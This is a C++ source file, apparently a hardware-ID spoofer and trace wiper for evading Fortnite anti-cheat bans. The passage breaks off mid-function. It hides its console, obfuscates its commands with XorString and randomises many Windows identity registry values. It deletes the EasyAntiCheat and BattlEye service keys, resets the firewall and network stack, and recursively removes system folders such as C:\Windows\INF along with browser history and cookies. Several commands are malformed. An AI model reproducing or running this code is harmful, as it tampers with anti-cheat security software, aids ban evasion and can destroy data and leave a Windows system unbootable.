//StHomeLess#2465
#pragma once
#include <iostream>
#include <urlmon.h>

#include "xhackorx.hpp"
#include "mac.h"
#include "kdmapper.hpp"
#include "driver.h"

#pragma comment(lib, "urlmon.lib")
#define _CRT_SECURE_NO_WARNINGS
#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

//---------------UTILS--------------//

using namespace std;
void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

//---------------REGS--------------//

int regedit()
{
	HideConsole();
	system(XorString("reg delete HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\Microsoft\\Windows\" \"NT\\CurrentVersion\\Notifications\\Data /v 418A073AA3BC3475 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f"));
	system(XorString("reg delete HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /f") );
	system(XorString("REG ADD HKCU\\Software\\Microsoft\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t REG_SZ /d {%random%-%random%-%random} /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\HardwareConfig\\Current /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLab /t REG_SZ /d %random%-%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\Software\\Microsoft /v BuildLabEx /t REG_SZ /d %random%-%random% /f") );
	system(XorString("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\kbdclass\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\mouhid\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v UserModeDriverGUID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildBranch /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildLab /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"0\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi\" \"Port\" \"1\\Scsi\" \"Bus\" \"0\\Target\" \"Id\" \"0\\Logical\" \"Unit\" \"Id\" \"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\ControlSet001\\Services\\BasicDisplay\\Video /v VideoID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Hostname /t REG_SZ /d DESKTOP-%random% /f") );
	system(XorString("REG ADD HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\System\\CurrentControlSet\\Control\\DevQuery\\6 /v UUID /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v NV\" \"Hostname /t REG_SZ /d DESKTOP-%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t REG_SZ /d {%random%%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v GUID /t REG_SZ /d {%random%%random%-%random%-%random%-%random%%random%} /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildGUID /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v REGisteredOwner /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v REGisteredOrganization /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v GUID /t REG_SZ /d %random%-%random%-%random%-%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_SZ /d %random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildLabEx /t REG_SZ /d %random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d {%random%%random%-%random%-%random%-%random%} /f") );
	system(XorString("REG delete HKCU\\Software\\Epic\" \"Games /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\Tracing\\Microsoft\\Profile\\Profile /v Guid /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Classes\\com.epicgames.launcher /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EpicGames /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\WOW6432Node\\Epic\" \"Games /f") );
	system(XorString("reg delete HKCR\\com.epicgames.launcher /f") );
	system(XorString("reg delete HKLM\\SYSTEM\\MountedDevices /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\LastEnum /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v AccountDomainSid /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v PingID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data /v SMBiosData /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v ClientUUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global /v PersistenceIdentifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\NVIDIA\" \"Corporation\\Global\\CoProcManager /v ChipsetMatchID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("reg delete HKLM\\SYSTEM\\MountedDevices /f") );
	system(XorString("reg delete HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\com.epicgames.launcher /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Dfrg\\Statistics /f") );
	system(XorString("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f") );
	system(XorString("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\CPC\\Volume /f") );
	system(XorString("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2 /f") );
	system(XorString("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f") );
	system(XorString("REG ADD HKCU\\Software\\Classes\\Interface /v ClsidStore /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareId /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v ComputerHardwareIds /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v MachineId /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("reg delete HKCU\\Software\\Classes\\Interface /v ClsidStore /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v _DriverProviderInfo /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000 /v UserModeDriverGUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack\\SettingsRequests /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v BackupProductKeyDefault /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v actionlist /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v ServiceSessionId /f") );
	system(XorString("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist /f") );
	system(XorString("reg delete HKCU\\Software\\Hex-Rays\\IDA\\History /f") );
	system(XorString("reg delete HKCU\\Software\\Hex-Rays\\IDA\\History64 /f") );
	system(XorString("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion\\SoftwareProtectionPlatform /v ServiceSessionId /f") );
	system(XorString("REG ADD HKCU\\Software\\Microsoft\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKCU\\Software\\Classes\\Installer\\Dependencies /v MSICache /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\TPM\\WMI /v WindowsAIKHash /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate /v SusClientIdValidation /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKCU\\SYSTEM\\CurrentControlSet\\Services\\TPM\\ODUID /v RandomSeed /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Internet\" \"Explorer\\Migration /v IE\" \"Installed\" \"Date /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v DigitalProductId4 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\SQMClient /v WinSqmFirstSessionStartTime /t REG_QWORD /d %random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_QWORD /d %random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_QWORD /d %random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack\\SevilleEventlogManager /v LastEventlogWrittenTime /t REG_QWORD /d %random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\System\\CurrentControlSet\\Control\\Notifications /v 418A073AA3BC8075 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f") );
	system(XorString("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Kernel-EventTracing\/Admin /v OwningPublisher /t REG_SZ /d {%random%-%random%-%random%%random%} /f") );;
	return TRUE;
}
void clean_launcher()
{
	HideConsole();
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini");
	DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini");
	DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini");
}
void clean_net()
{
	HideConsole();
	system(XorString("netsh winsock reset") );
	system(XorString("netsh winsock reset catalog") );
	system(XorString("netsh int ip reset") );
	system(XorString("netsh advfirewall reset") );
	system(XorString("netsh int reset all") );
	system(XorString("netsh int ipv4 reset") );
	system(XorString("netsh int ipv6 reset") );
	system(XorString("ipconfig / release") );
	system(XorString("ipconfig / renew") );
	system(XorString("ipconfig / flushdns") );
}
void clean_anticheat()
{
	HideConsole();
	system(XorString("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EasyAntiCheat /f") );
	system(XorString("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f") );
	system(XorString("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f") );
}
std::wstring GetCurrentUserName()
{
	wchar_t
		un[UNLEN + 1];
	DWORD unLen = UNLEN + 1;
	GetUserNameW(un, &unLen);
	return un;
}
void wipe_c() 
{
	HideConsole();
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved") );
	system(XorString("rmdir /s /q C:\\Windows\\INF") );
	system(XorString("rmdir /s /q C:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache") );
	system(XorString("rmdir /s /q C:\\Users\\Public\\Documents") );
	system(XorString("rmdir /s /q C:\\Windows\\Prefetch") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\D3DSCache") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\CrashReportClient") );
	system(XorString("rmdir /s /q C:\\Windows\\temp") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore") );
	system(XorString("rmdir /s /q C:\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache") );
	system(XorString("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q C:\\Windows\\Prefetch") );
	system(XorString("@del /s /f /a:h / a : a / q C:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings") );
	system(XorString("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins") );
	system(XorString("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins") );
	system(XorString("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir") );
	system(XorString("rmdir /s /q ""\"\C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config") );
	system(XorString("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat") );
	system(XorString("del /f /s /q C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache") );
	system(XorString("del /f /s /q C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules") );
	system(XorString("rmdir /s /q C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History") );
	system(XorString("rmdir /s /q C:\\Users\\%username%\\Intel") );
	system(XorString("rmdir /s /q C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q ""\"\C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
}
void wipe_d() 
{
	HideConsole();
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved") );
	system(XorString("rmdir /s /q D:\\Windows\\INF") );
	system(XorString("rmdir /s /q D:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache") );
	system(XorString("rmdir /s /q D:\\Users\\Public\\Documents") );
	system(XorString("rmdir /s /q D:\\Windows\\Prefetch") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\D3DSCache") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\CrashReportClient") );
	system(XorString("rmdir /s /q D:\\Windows\\temp") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore") );
	system(XorString("rmdir /s /q D:\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q D:\\ProgramData\\Microsoft\\Windows\\WER\\Temp") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache") );
	system(XorString("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q D:\\Windows\\Prefetch") );
	system(XorString("@del /s /f /a:h / a : a / q D:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings") );
	system(XorString("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins") );
	system(XorString("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins") );
	system(XorString("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir") );
	system(XorString("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config") );
	system(XorString("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat") );
	system(XorString("del /f /s /q D:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache") );
	system(XorString("del /f /s /q D:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules") );
	system(XorString("rmdir /s /q D:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History") );
	system(XorString("rmdir /s /q D:\\Users\\%username%\\Intel") );
	system(XorString("rmdir /s /q D:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
}
void wipe_e() 
{
	HideConsole();
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved") );
	system(XorString("rmdir /s /q E:\\Windows\\INF") );
	system(XorString("rmdir /s /q E:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache") );
	system(XorString("rmdir /s /q E:\\Users\\Public\\Documents") );
	system(XorString("rmdir /s /q E:\\Windows\\Prefetch") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\D3DSCache") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\CrashReportClient") );
	system(XorString("rmdir /s /q E:\\Windows\\temp") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore") );
	system(XorString("rmdir /s /q E:\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q E:\\ProgramData\\Microsoft\\Windows\\WER\\Temp") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache") );
	system(XorString("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q E:\\Windows\\Prefetch") );
	system(XorString("@del /s /f /a:h / a : a / q E:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings") );
	system(XorString("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins") );
	system(XorString("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins") );
	system(XorString("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir") );
	system(XorString("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config") );
	system(XorString("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat") );
	system(XorString("del /f /s /q E:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache") );
	system(XorString("del /f /s /q E:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules") );
	system(XorString("rmdir /s /q E:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache") );
